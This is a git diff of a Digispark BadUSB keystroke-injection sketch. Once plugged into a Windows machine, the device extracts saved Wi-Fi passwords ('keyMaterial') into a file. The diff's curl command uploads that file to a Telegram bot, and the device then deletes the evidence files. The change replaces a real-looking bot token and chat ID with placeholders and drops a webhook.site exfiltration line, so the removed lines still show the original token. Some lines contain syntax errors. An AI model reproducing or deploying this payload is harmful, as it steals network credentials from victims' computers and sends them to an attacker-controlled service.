@@ -36,9 +36,8 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS.txt"); 
   DigiKeyboard.delay(500);
-  Digikeyboard.printIn("curl -X POST "https://api.telegram.org/bot7041115900:AAHtHncvWaZAE1ED4S9XIChdfTOqP95BT4c/sendDocument" -F
- "chat_id=6100927257" -F "document=@Wi-Fi-PASS.txt"");
-//  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/ -Method POST -InFile Wi-Fi-PASS"); 
+  Digikeyboard.printIn("curl -X POST "https://api.telegram.org/bot<YOUR_BOT_API_KEY>/sendDocument" -F
+ "chat_id=<YOUR_CHAT_ID>" -F "document=@Wi-Fi-PASS.txt"");
   DigiKeyboard.delay(1000);
   DigiKeyboard.println("del Wi-* /s /f /q"); 
   DigiKeyboard.delay(100);
